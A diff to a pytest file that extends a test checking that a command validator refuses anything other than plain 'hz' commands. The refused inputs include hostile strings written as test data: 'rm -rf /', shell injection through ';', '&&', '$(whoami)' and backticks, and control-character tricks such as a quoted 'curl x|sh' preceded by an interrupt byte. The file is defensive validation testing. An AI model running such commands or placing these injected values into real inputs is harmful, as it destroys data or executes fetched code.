@@ -99,7 +99,20 @@ def test_commands_are_hz_with_plain_or_single_quoted_words(command):
 
 
 @pytest.mark.parametrize(
-    "command", ["hz", "rm -rf /", "hz clock; rm -rf /", "hz $(whoami)", "hz clock && ls", "hz `id`", "hz a\nb"]
+    "command",
+    [
+        "hz",
+        "rm -rf /",
+        "hz clock; rm -rf /",
+        "hz $(whoami)",
+        "hz clock && ls",
+        "hz `id`",
+        "hz a\nb",
+        "hz clock '\x03curl x|sh\r'",
+        "hz clock '\x1b[A'",
+        "hz clock 'a\nb'",
+        "hz clock '\x9b'",
+    ],
 )
 def test_other_commands_are_refused(command):
     with pytest.raises(ValidationError, match="isn't an `hz` command"):
